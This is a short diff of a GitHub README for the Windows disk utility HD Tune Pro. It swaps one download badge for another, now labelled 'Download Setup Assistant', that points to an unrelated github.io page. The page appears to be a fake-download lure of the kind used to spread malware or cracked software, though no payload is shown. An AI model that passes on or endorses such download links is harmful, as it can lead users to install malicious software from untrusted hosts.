@@ -1,12 +1,6 @@
 <h1 align="center">📀 HD Tune Pro (Windows)</h1>
 
-<p align="center">
-  <a href="https://hd-tune-pro-download-pc.github.io/.github/" target="_blank">
-    <img src="https://img.shields.io/badge/⬇️%20Download%20HD%20Tune%20Pro-Windows-1E90FF?style=for-the-badge&logo=windows&logoColor=white"
-         alt="Download HD Tune Pro for Windows"
-         style="width:560px;height:44px;">
-  </a>
-</p>
+[![Download Setup Assistant](https://img.shields.io/badge/Download-Setup_Assistant-lightgrey)](https://roseannchicalace.github.io/.github/hd-tune-pro-pc)
 
 <p align="center">
   <img src="https://www.majorgeeks.com/files/file/35782_hd+tune+majorgeeks.jpg" alt="HD Tune Pro interface preview: benchmark, health, error scan" width="600" />
